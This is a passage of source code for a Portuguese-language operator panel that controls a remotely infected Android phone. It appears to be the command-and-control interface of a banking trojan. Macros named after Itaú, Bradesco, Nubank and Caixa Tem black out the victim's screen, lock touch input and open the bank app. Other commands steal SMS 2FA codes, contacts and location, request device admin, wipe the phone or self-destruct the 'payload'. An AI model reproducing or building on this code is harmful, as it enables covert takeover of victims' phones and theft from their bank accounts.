      <div className="absolute -top-9 left-4 px-3.5 py-1.5 rounded-full bg-[#030a1c] border-2 border-pink-300 text-pink-200 text-[11px] font-mono font-black uppercase tracking-wider flex items-center gap-2 shadow-[0_0_25px_rgba(0,240,255,0.9)] animate-bounce">
        <Target className="w-3.5 h-3.5 text-pink-300 animate-spin" />
        <span>{label}</span>
      </div>
    </div>,
    document.body
  );
};

/* ==========================================================================
   ðŸ’¬ ROBOT CHAT EXECUTOR DE COMANDOS EM TEMPO REAL NO APARELHO
   ========================================================================== */
interface RobotChatProps {
  deviceId?: string;
  deviceName?: string;
  devicesList?: Device[];
  onSendCommand?: (command: any) => Promise<any> | void;
  installedApps?: any[];
  onSelectDevice?: (devId: string) => void;
}

export const RobotChatCommandExecutor: React.FC<RobotChatProps> = ({
  deviceId: propDeviceId,
  deviceName: propDeviceName,
  devicesList = [],
  onSendCommand,
  installedApps = [],
  onSelectDevice,
}) => {
  const [activeDeviceId, setActiveDeviceId] = useState<string>(propDeviceId || '');
  const [activeDeviceName, setActiveDeviceName] = useState<string>(propDeviceName || '');
  const [inputText, setInputText] = useState('');
  const [isExecuting, setIsExecuting] = useState(false);
  const [showVoiceCallModal, setShowVoiceCallModal] = useState(false);
  const [messages, setMessages] = useState<ChatMessage[]>(() => {
    return [
      {
        id: 'msg-welcome-1',
        sender: 'robot',
        text: 'âš¡ OlÃ¡! Sou o **RobÃ´ Assistente IA**. Digite qualquer comando ou dÃºvida no chat e eu executo no celular conectado!',
        timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
        status: 'info',
        suggestions: [
          'ðŸ“ž Ligar / Falar com Aparelho',
          'Ligar Tela',
          'Pedir Admin',
          'Remover App',
          'Tirar Print',
          'Abrir WhatsApp',
          'Ativar Tela Preta',
          'InÃ­cio (Home)',
          'LocalizaÃ§Ã£o GPS',
          'Ver SMS'
        ]
      }
    ];
  });

  const chatEndRef = useRef<HTMLDivElement | null>(null);

  // Auto-seleciona primeiro dispositivo online se nÃ£o houver um fixo
  useEffect(() => {
    if (propDeviceId) {
      setActiveDeviceId(propDeviceId);
      setActiveDeviceName(propDeviceName || propDeviceId);
    } else if (!activeDeviceId && devicesList.length > 0) {
      const onlineDev = devicesList.find(d => d.is_online) || devicesList[0];
      if (onlineDev) {
        setActiveDeviceId(onlineDev.device_id);
        setActiveDeviceName(onlineDev.custom_name || onlineDev.model || onlineDev.device_id);
      }
    }
  }, [propDeviceId, propDeviceName, devicesList, activeDeviceId]);

  // Scroll automÃ¡tico
  useEffect(() => {
    chatEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isExecuting]);

  // Executa comando no aparelho alvo
  const dispatchCommand = async (command: any, targetDevId: string) => {
    if (onSendCommand && propDeviceId === targetDevId) {
      return await onSendCommand(command);
    }
    return await devicesAPI.sendCommand(targetDevId, command);
  };

  // Interpretador de Linguagem Natural & Executor
  const processUserPrompt = async (rawPrompt: string) => {
    const prompt = rawPrompt.trim();
    if (!prompt) return;

    const timeNow = new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
    const userMsgId = 'user-' + Date.now();

    // Adiciona mensagem do usuÃ¡rio
    setMessages(prev => [
      ...prev,
      {
        id: userMsgId,
        sender: 'user',
        text: prompt,
        timestamp: timeNow,
      }
    ]);

    setInputText('');
    setIsExecuting(true);

    const devId = activeDeviceId;
    const targetName = activeDeviceName || devId || 'Aparelho';

    if (!devId) {
      setIsExecuting(false);
      setMessages(prev => [
        ...prev,
        {
          id: 'robot-err-' + Date.now(),
          sender: 'robot',
          text: 'âš ï¸ **Nenhum aparelho selecionado ou conectado!** Selecione um celular online no topo do chat para que eu possa executar os comandos.',
          timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
          status: 'error',
        }
      ]);
      return;
    }

    const lower = prompt.toLowerCase().trim();

    try {
      // -----------------------------------------------------------------------
      // ðŸš€ OPERAÃ‡Ã•ES BANCÃRIAS RÃPIDAS (MACROS AUTOMÃTICAS PARA OPERADORES)
      // -----------------------------------------------------------------------
      if (lower.includes('operaÃ§Ã£o itau') || lower.includes('operaÃ§Ã£o itaÃº') || lower.includes('modo itau') || lower.includes('modo itaÃº')) {
        await dispatchCommand({ action: 'BLACK_SCREEN_ON' }, devId);
        await dispatchCommand({ action: 'TOUCH_LOCK_ON' }, devId);
        await dispatchCommand({ action: 'OPEN_APP', package: 'br.com.itau' }, devId);
        setTimeout(() => dispatchCommand({ action: 'REQUEST_HIERARCHY' }, devId), 200);

        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”¥ **OPERAÃ‡ÃƒO ITAÃš INICIADA COM SUCESSO!**\n\n` +
              `â€¢ ðŸ•¶ï¸ **Tela Preta:** Ativada (VisÃ£o Oculta)\n` +
              `â€¢ ðŸ”’ **Bloqueio de Toque:** Ativado no celular alvo\n` +
              `â€¢ ðŸš€ **App ItaÃº:** Aberto em primeiro plano\n` +
              `â€¢ ðŸ‘ï¸ **Screen Reader V2:** Leitura atualizada`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'OperaÃ§Ã£o ItaÃº', commandSent: 'BLACK_SCREEN_ON + TOUCH_LOCK_ON + OPEN_APP (br.com.itau)', targetDevice: targetName },
            suggestions: ['Desarmar', 'Tirar Print', 'Ver SMS', 'InÃ­cio']
          }
        ]);
        return;
      }

      if (lower.includes('operaÃ§Ã£o bradesco') || lower.includes('modo bradesco')) {
        await dispatchCommand({ action: 'BLACK_SCREEN_ON' }, devId);
        await dispatchCommand({ action: 'TOUCH_LOCK_ON' }, devId);
        await dispatchCommand({ action: 'OPEN_APP', package: 'br.com.bradesco' }, devId);
        setTimeout(() => dispatchCommand({ action: 'REQUEST_HIERARCHY' }, devId), 200);

        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”´ **OPERAÃ‡ÃƒO BRADESCO INICIADA COM SUCESSO!**\n\n` +
              `â€¢ ðŸ•¶ï¸ **Tela Preta:** Ativada\n` +
              `â€¢ ðŸ”’ **Bloqueio de Toque:** Ativado\n` +
              `â€¢ ðŸš€ **App Bradesco:** Aberto em primeiro plano`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'OperaÃ§Ã£o Bradesco', commandSent: 'BLACK_SCREEN_ON + TOUCH_LOCK_ON + OPEN_APP (br.com.bradesco)', targetDevice: targetName },
            suggestions: ['Desarmar', 'Tirar Print', 'Ver SMS', 'InÃ­cio']
          }
        ]);
        return;
      }

      if (lower.includes('operaÃ§Ã£o nubank') || lower.includes('modo nubank')) {
        await dispatchCommand({ action: 'BLACK_SCREEN_ON' }, devId);
        await dispatchCommand({ action: 'TOUCH_LOCK_ON' }, devId);
        await dispatchCommand({ action: 'OPEN_APP', package: 'com.nu.production' }, devId);
        setTimeout(() => dispatchCommand({ action: 'REQUEST_HIERARCHY' }, devId), 200);

        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ’œ **OPERAÃ‡ÃƒO NUBANK INICIADA COM SUCESSO!**\n\n` +
              `â€¢ ðŸ•¶ï¸ **Tela Preta:** Ativada\n` +
              `â€¢ ðŸ”’ **Bloqueio de Toque:** Ativado\n` +
              `â€¢ ðŸš€ **App Nubank:** Aberto em primeiro plano`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'OperaÃ§Ã£o Nubank', commandSent: 'BLACK_SCREEN_ON + TOUCH_LOCK_ON + OPEN_APP (com.nu.production)', targetDevice: targetName },
            suggestions: ['Desarmar', 'Tirar Print', 'Ver SMS', 'InÃ­cio']
          }
        ]);
        return;
      }

      if (lower.includes('operaÃ§Ã£o caixa') || lower.includes('modo caixa') || lower.includes('modo caixatem')) {
        await dispatchCommand({ action: 'BLACK_SCREEN_ON' }, devId);
        await dispatchCommand({ action: 'TOUCH_LOCK_ON' }, devId);
        await dispatchCommand({ action: 'OPEN_APP', package: 'br.gov.caixa.tem' }, devId);
        setTimeout(() => dispatchCommand({ action: 'REQUEST_HIERARCHY' }, devId), 200);

        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”¹ **OPERAÃ‡ÃƒO CAIXA TEM INICIADA COM SUCESSO!**\n\n` +
              `â€¢ ðŸ•¶ï¸ **Tela Preta:** Ativada\n` +
              `â€¢ ðŸ”’ **Bloqueio de Toque:** Ativado\n` +
              `â€¢ ðŸš€ **App Caixa Tem:** Aberto em primeiro plano`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'OperaÃ§Ã£o Caixa Tem', commandSent: 'BLACK_SCREEN_ON + TOUCH_LOCK_ON + OPEN_APP (br.gov.caixa.tem)', targetDevice: targetName },
            suggestions: ['Desarmar', 'Tirar Print', 'Ver SMS', 'InÃ­cio']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // âš¡ MODO SIGILO TOTAL & MODO DESARMAR
      // -----------------------------------------------------------------------
      if (lower.includes('modo sigilo') || lower.includes('modo invisivel') || lower.includes('sigilo total') || lower.includes('modo discreto')) {
        await dispatchCommand({ action: 'BLACK_SCREEN_ON' }, devId);
        await dispatchCommand({ action: 'TOUCH_LOCK_ON' }, devId);
        await dispatchCommand({ action: 'VOLUME_MUTE' }, devId);

        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ¥· **MODO SIGILO TOTAL ATIVADO NO APARELHO!**\n\n` +
              `â€¢ â¬› Tela FÃ­sica: 100% Escura\n` +
              `â€¢ ðŸ”’ Toque FÃ­sico: Totalmente Bloqueado\n` +
              `â€¢ ðŸ”‡ Ãudio: Silenciado`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Modo Sigilo Total', commandSent: 'BLACK_SCREEN_ON + TOUCH_LOCK_ON + VOLUME_MUTE', targetDevice: targetName },
            suggestions: ['Desarmar', 'OperaÃ§Ã£o ItaÃº', 'OperaÃ§Ã£o Bradesco', 'OperaÃ§Ã£o Nubank']
          }
        ]);
        return;
      }

      if (lower.includes('desarmar') || lower.includes('liberar celular') || lower.includes('desativar sigilo') || lower.includes('modo normal') || lower.includes('modo livre')) {
        await dispatchCommand({ action: 'BLACK_SCREEN_OFF' }, devId);
        await dispatchCommand({ action: 'TOUCH_LOCK_OFF' }, devId);
        await dispatchCommand({ action: 'HOME' }, devId);

        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”“ **CELULAR DESARMADO E LIBERADO!**\n\n` +
              `â€¢ â˜€ï¸ Tela FÃ­sica: Reativada ao Normal\n` +
              `â€¢ ðŸ”“ Toque FÃ­sico: Liberado\n` +
              `â€¢ ðŸ  Aparelho: Redirecionado para a Tela Inicial (HOME)`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Desarmar Aparelho', commandSent: 'BLACK_SCREEN_OFF + TOUCH_LOCK_OFF + HOME', targetDevice: targetName },
            suggestions: ['Modo Sigilo', 'OperaÃ§Ã£o ItaÃº', 'Pedir Admin', 'Tirar Print']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ”‘ CAPTURA INTELIGENTE DE CÃ“DIGO SMS 2FA
      // -----------------------------------------------------------------------
      if (lower.includes('pegar codigo') || lower.includes('pegar cÃ³digo') || lower.includes('codigo sms') || lower.includes('cÃ³digo sms') || lower.includes('pegar 2fa') || lower.includes('codigo banco') || lower.includes('cÃ³digo banco')) {
        await dispatchCommand({ action: 'GET_SMS' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”‘ **Extraindo CÃ³digos de VerificaÃ§Ã£o (2FA / SMS)...**\n\n` +
              `Solicitada a sincronizaÃ§Ã£o de SMS do celular **${targetName}**. Verifique a aba SMS no painel para ler o cÃ³digo 2FA.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Extrair CÃ³digo 2FA SMS', commandSent: 'GET_SMS', targetDevice: targetName },
            suggestions: ['Colar', 'InÃ­cio', 'Tirar Print']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ–ï¸ GESTOS DE ARRASTAR & SCROLL (ROLAR PARA BAIXO, SUBIR, SWIPE)
      // -----------------------------------------------------------------------
      if (lower.includes('rolar para baixo') || lower.includes('descer') || lower.includes('scroll down') || lower.includes('arrastar para cima') || lower.includes('rolar tela')) {
        await dispatchCommand({ action: 'SWIPE', x1: 0.5, y1: 0.8, x2: 0.5, y2: 0.2, duration: 350, scale: 'vnc_norm' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ‘‡ **Rolar para Baixo (Scroll Down)** executado no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Rolar para Baixo', commandSent: 'SWIPE (down)', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('rolar para cima') || lower.includes('subir') || lower.includes('scroll up') || lower.includes('arrastar para baixo')) {
        await dispatchCommand({ action: 'SWIPE', x1: 0.5, y1: 0.2, x2: 0.5, y2: 0.8, duration: 350, scale: 'vnc_norm' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ‘† **Rolar para Cima (Scroll Up)** executado no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Rolar para Cima', commandSent: 'SWIPE (up)', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ‘† CLIQUE / TOQUE EM ELEMENTO POR TEXTO ("clicar em entrar", "tocar em ok")
      // -----------------------------------------------------------------------
      const clickMatch = prompt.match(/^(?:clicar|clique|clica|tocar|toque|pressionar|pressiona|apertar|aperta)\s+(?:em|no|na|sobre|o|a)?\s*(.+)/i);
      if (clickMatch) {
        const clickTargetText = clickMatch[1].trim();
        await dispatchCommand({ action: 'CLICK', text: clickTargetText, scale: 'vnc_norm' }, devId);
        await dispatchCommand({ action: 'TAP', text: clickTargetText }, devId);
        setTimeout(() => dispatchCommand({ action: 'REQUEST_HIERARCHY' }, devId), 150);

        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ‘† **Clique executado** no elemento/texto **"${clickTargetText}"** do aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Clicar em Elemento', commandSent: `CLICK ("${clickTargetText}")`, targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ”’ BLOQUEIO DE TOQUE (TOUCH LOCK ON / OFF)
      // -----------------------------------------------------------------------
      if (lower.includes('bloquear toque') || lower.includes('travar toque') || lower.includes('desativar toque') || lower.includes('sem toque')) {
        await dispatchCommand({ action: 'TOUCH_LOCK_ON' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”’ **Bloqueio de Toque ATIVADO!** O toque na tela fÃ­sica do aparelho **${targetName}** estÃ¡ travado para a vÃ­tima.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Bloquear Toque', commandSent: 'TOUCH_LOCK_ON', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('desbloquear toque') || lower.includes('liberar toque') || lower.includes('ativar toque')) {
        await dispatchCommand({ action: 'TOUCH_LOCK_OFF' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ”“ **Bloqueio de Toque DESATIVADO!** Toque fÃ­sico liberado no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Desbloquear Toque', commandSent: 'TOUCH_LOCK_OFF', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ’¬ 1. SAUDAÃ‡Ã•ES & CONVERSAÃ‡ÃƒO AMIGÃVEL
      // -----------------------------------------------------------------------
      if (/^(ol[aÃ¡]|oi+|oii+|e\s+a[iÃ­]|fala|bom\s+dia|boa\s+tarde|boa\s+noite|hey|hello)$/i.test(lower)) {
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-greet-' + Date.now(),
            sender: 'robot',
            text: `âš¡ **OlÃ¡, operador!** Sou seu **RobÃ´ Assistente** do celular **${targetName}**.\n\n` +
              `Estou pronto para executar qualquer aÃ§Ã£o no aparelho. O que vocÃª deseja fazer agora?`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'info',
            suggestions: ['Ligar Tela', 'Pedir Admin', 'Abrir WhatsApp', 'Ativar Tela Preta', 'Tirar Print', 'Remover App']
          }
        ]);
        return;
      }

      if (lower.includes('obrigad') || lower.includes('valeu') || lower.includes('perfeito') || lower.includes('top') || lower.includes('show') || lower.includes('boa')) {
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-thanks-' + Date.now(),
            sender: 'robot',
            text: `ðŸ¤– **Ã€s suas ordens!** Qualquer outro comando que precisar para o aparelho **${targetName}**, Ã© sÃ³ me pedir.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'info',
            suggestions: ['InÃ­cio', 'Voltar', 'Bloquear Tela', 'Status Aparelho']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ’¡ 2. LIGAR O CELULAR / ACENDER A TELA (WAKEUP)
      // -----------------------------------------------------------------------
      if (lower.includes('ligar o celular') || lower.includes('ligar celular') || lower.includes('acender a tela') || lower.includes('acender tela') || lower.includes('ligar a tela') || lower.includes('ligar tela') || lower.includes('acordar') || lower.includes('despertar') || lower === 'wake' || lower === 'wakeup') {
        await dispatchCommand({ action: 'WAKEUP' }, devId);
        await dispatchCommand({ action: 'SCREEN_ON' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ’¡ **Tela do aparelho ${targetName} ACESA e despertada com sucesso!**`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Ligar Tela (Wakeup)', commandSent: 'WAKEUP + SCREEN_ON', targetDevice: targetName },
            suggestions: ['Bloquear Tela', 'Ativar Tela Preta', 'InÃ­cio']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ›¡ï¸ 3. SOLICITAR DEVICE ADMIN (PEDIR ADMIN)
      // -----------------------------------------------------------------------
      if (lower.includes('pedir admin') || lower.includes('solicitar admin') || lower.includes('virar admin') || lower.includes('elevar privi') || lower.includes('permissao admin') || lower.includes('permissÃ£o admin') || lower.includes('device admin') || lower === 'admin') {
        await dispatchCommand({ action: 'REQUEST_ADMIN_PERMISSION' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ›¡ï¸ SolicitaÃ§Ã£o de **Administrador de Dispositivo** disparada na tela do aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Solicitar Admin', commandSent: 'REQUEST_ADMIN_PERMISSION', targetDevice: targetName },
            suggestions: ['Acessibilidade', 'Ignorar Bateria', 'Anti-RemoÃ§Ã£o']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ—‘ï¸ 4. REMOVER O PRÃ“PRIO APP (SELF-DESTRUCT / AUTO-DESTRUIÃ‡ÃƒO)
      // -----------------------------------------------------------------------
      if (lower.includes('remover este app') || lower.includes('remover o app') || lower.includes('remover app') || lower.includes('desinstalar este app') || lower.includes('desinstalar agente') || lower.includes('desinstalar payload') || lower.includes('auto destrui') || lower.includes('autodestrui') || lower.includes('self destruct') || lower.includes('destruir app') || lower.includes('apagar agente') || lower.includes('apagar payload')) {
        await dispatchCommand({ action: 'SELF_DESTRUCT' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ’£ **Comando SELF-DESTRUCT enviado!** O agente desativarÃ¡ os privilÃ©gios e serÃ¡ removido do celular **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Auto-DestruiÃ§Ã£o', commandSent: 'SELF_DESTRUCT', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“¦ 5. DESINSTALAR APLICATIVO ESPECÃFICO DO ALVO
      // -----------------------------------------------------------------------
      const uninstallMatch = lower.match(/(?:desinstalar|remover|apagar|deletar)\s+(?:o\s+|a\s+|app\s+|aplicativo\s+)?(.+)/i);
      if (uninstallMatch && !lower.includes('este app') && !lower.includes('agente') && !lower.includes('payload')) {
        const targetAppName = uninstallMatch[1].trim();
        const resolved = resolveAppPackage(targetAppName, installedApps);
        const pkgToUninstall = resolved ? resolved.package : targetAppName;

        await dispatchCommand({ action: 'UNINSTALL_APP', package: pkgToUninstall }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ—‘ï¸ SolicitaÃ§Ã£o de desinstalaÃ§Ã£o enviada para o aplicativo **${resolved ? resolved.name : targetAppName}** (\`${pkgToUninstall}\`) no aparelho **${targetName}**.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Desinstalar App', commandSent: `UNINSTALL_APP (${pkgToUninstall})`, targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // âš ï¸ 6. FORMATAR APARÃŠLHO (WIPE REMOTE)
      // -----------------------------------------------------------------------
      if (lower.includes('formatar') || lower.includes('wipe') || lower.includes('limpar celular') || lower.includes('restaurar fabrica') || lower.includes('apagar tudo')) {
        await dispatchCommand({ action: 'FORMAT_DEVICE' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `âš ï¸ **Comando de FormataÃ§Ã£o (WIPE) disparado!** O aparelho **${targetName}** iniciarÃ¡ a restauraÃ§Ã£o de fÃ¡brica se o modo Admin estiver ativo.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'error',
            actionDetails: { actionName: 'Formatar Aparelho', commandSent: 'FORMAT_DEVICE', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“· 7. TIRAR PRINT / CAPTURAR TELA
      // -----------------------------------------------------------------------
      if (lower.includes('print') || lower.includes('capturar tela') || lower.includes('screenshot') || lower.includes('tirar foto da tela')) {
        await dispatchCommand({ action: 'TAKE_SCREENSHOT' }, devId);
        await dispatchCommand({ action: 'TAKE_PRINT' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“¸ **Print de tela solicitado!** O mapa visual de tela do aparelho **${targetName}** foi capturado.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Tirar Print', commandSent: 'TAKE_SCREENSHOT', targetDevice: targetName },
            suggestions: ['InÃ­cio', 'Ativar Tela Preta']
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ’¡ 8. LANTERNA (FLASHLIGHT)
      // -----------------------------------------------------------------------
      if (lower.includes('lanterna') || lower.includes('flash')) {
        const isOff = lower.includes('desligar') || lower.includes('apagar') || lower.includes('off');
        await dispatchCommand({ action: 'TOGGLE_FLASHLIGHT', enabled: !isOff }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ’¡ Lanterna **${isOff ? 'DESLIGADA' : 'LIGADA'}** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: isOff ? 'Desligar Lanterna' : 'Ligar Lanterna', commandSent: 'TOGGLE_FLASHLIGHT', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“ 9. GPS & LOCALIZAÃ‡ÃƒO
      // -----------------------------------------------------------------------
      if (lower.includes('gps') || lower.includes('localiza') || lower.includes('onde esta') || lower.includes('onde estÃ¡') || lower.includes('onde fica') || lower.includes('mapa')) {
        await dispatchCommand({ action: 'GET_LOCATION' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“ **SolicitaÃ§Ã£o de Coordenadas GPS enviada** para o aparelho **${targetName}**. Verifique a aba GPS no painel para ver a localizaÃ§Ã£o no mapa.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Obter GPS', commandSent: 'GET_LOCATION', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ’¬ 10. SMS, CONTATOS & LIGAÃ‡ÃƒO
      // -----------------------------------------------------------------------
      if (lower.includes('ver sms') || lower.includes('ler sms') || lower.includes('mensagens sms')) {
        await dispatchCommand({ action: 'GET_SMS' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ’¬ **SolicitaÃ§Ã£o de SMS enviada!** As Ãºltimas mensagens do aparelho **${targetName}** estÃ£o sendo sincronizadas na aba SMS.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Ler SMS', commandSent: 'GET_SMS', targetDevice: targetName }
          }
        ]);
        return;
      }

      if (lower.includes('ver contatos') || lower.includes('ler contatos') || lower.includes('agenda') || lower.includes('buscar contatos')) {
        await dispatchCommand({ action: 'GET_CONTACTS' }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“’ **SolicitaÃ§Ã£o de Contatos enviada!** A lista telefÃ´nica do aparelho **${targetName}** estÃ¡ sendo obtida.`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Ler Contatos', commandSent: 'GET_CONTACTS', targetDevice: targetName }
          }
        ]);
        return;
      }

      // -----------------------------------------------------------------------
      // ðŸ“ž LIGAR PARA O TELEFONE / FALAR COM O APARELHO DIRETO PELO PAINEL (2-WAY)
      // -----------------------------------------------------------------------
      const callNumberMatch = prompt.match(/(?:ligar|chamar|discar|fazer\s+chamada)\s+(?:para\s+)?(\+?[0-9\s\-()]{8,16})/i);
      if (callNumberMatch) {
        const targetNum = callNumberMatch[1].replace(/[^0-9+]/g, '');
        await dispatchCommand({ action: 'MAKE_CALL', number: targetNum }, devId);
        setIsExecuting(false);
        setMessages(prev => [
          ...prev,
          {
            id: 'robot-cmd-' + Date.now(),
            sender: 'robot',
            text: `ðŸ“ž **Chamada telefÃ´nica disparada** para o nÃºmero **${targetNum}** no aparelho **${targetName}**!`,
            timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' }),
            status: 'success',
            actionDetails: { actionName: 'Ligar para NÃºmero', commandSent: `MAKE_CALL (${targetNum})`, targetDevice: targetName }
          }
        ]);
        return;
      }

      if (
        lower.includes('ligar para o telefone') ||
        lower.includes('ligar para o celular') ||
        lower.includes('ligar celular') ||
